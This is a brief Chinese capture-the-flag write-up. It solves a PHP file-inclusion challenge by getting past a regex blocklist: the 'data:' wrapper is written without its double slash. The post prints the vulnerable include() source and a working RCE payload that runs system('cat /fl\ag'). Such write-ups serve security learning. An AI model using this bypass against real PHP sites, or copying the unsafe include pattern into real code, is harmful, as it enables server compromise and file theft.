### data 伪协议 RCE 绕过双斜杠

话不多说，直接上题（青少年 CTF 练习平台）

![](https://pic1.imgdb.cn/item/683d81d058cb8da5c82526cb.png)

打开网页给出了源码

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

if(isset($_GET['file'])){
        $file = $_GET['file'];
}
// 假如我增加了过滤，你又该如何应对呢？
if(preg_match('/php:\/\/|file:\/\/|flag|http:\/\/|log|phar:\/\/|data:\/\//i', $file)){
        echo 'No No No !';
}
else{
        include $file;
}
```

![](https://pic1.imgdb.cn/item/683d81f258cb8da5c82526e6.png)

这里的正则只匹配了 `data://`，没有过滤整个 `data` 伪协议，所以我们去掉 `//` 即可绕过

```php
?file=data:text/plain,<?php system('cat /fl\ag');?>
```

![](https://pic1.imgdb.cn/item/683d82ad58cb8da5c8252740.png)